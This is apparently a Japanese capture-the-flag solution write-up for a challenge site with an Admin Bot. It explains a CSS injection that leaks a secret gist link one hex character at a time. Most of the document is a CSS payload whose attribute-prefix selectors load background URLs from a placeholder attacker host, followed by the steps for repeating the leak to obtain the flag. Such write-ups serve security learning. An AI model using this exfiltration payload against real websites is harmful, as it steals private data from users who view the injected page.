# Solution

TODO: Pythonで自動化する

CSS Injectionを用いる。

```css
a[href^=gist0] {
  background: url(https://[your.example.com]?value=gist0);
}
a[href^=gist1] {
  background: url(https://[your.example.com]?value=gist1);
}
a[href^=gist2] {
  background: url(https://[your.example.com]?value=gist2);
}
a[href^=gist3] {
  background: url(https://[your.example.com]?value=gist3);
}
a[href^=gist4] {
  background: url(https://[your.example.com]?value=gist4);
}
a[href^=gist5] {
  background: url(https://[your.example.com]?value=gist5);
}
a[href^=gist6] {
  background: url(https://[your.example.com]?value=gist6);
}
a[href^=gist7] {
  background: url(https://[your.example.com]?value=gist7);
}
a[href^=gist8] {
  background: url(https://[your.example.com]?value=gist8);
}
a[href^=gist9] {
  background: url(https://[your.example.com]?value=gist9);
}
a[href^=gista] {
  background: url(https://[your.example.com]?value=gista);
}
a[href^=gistb] {
  background: url(https://[your.example.com]?value=gistb);
}
a[href^=gistc] {
  background: url(https://[your.example.com]?value=gistc);
}
a[href^=gistd] {
  background: url(https://[your.example.com]?value=gistd);
}
a[href^=giste] {
  background: url(https://[your.example.com]?value=giste);
}
a[href^=gistf] {
  background: url(https://[your.example.com]?value=gistf);
}
```

これをstylesheetに投げてURLを作る。
そのURLを `http://web:3000/` prefixにしてAdmin Botにreportする。

すると、your.example.comに飛んできたリクエストから一文字確定できる。
その一文字を `gista` としたとき、2文字目を `0-9a-f` で並べて再度送る。
これを12回行うとhrefの中身が得られる。

その後、得られたURLにアクセスすると、flagが得られる。
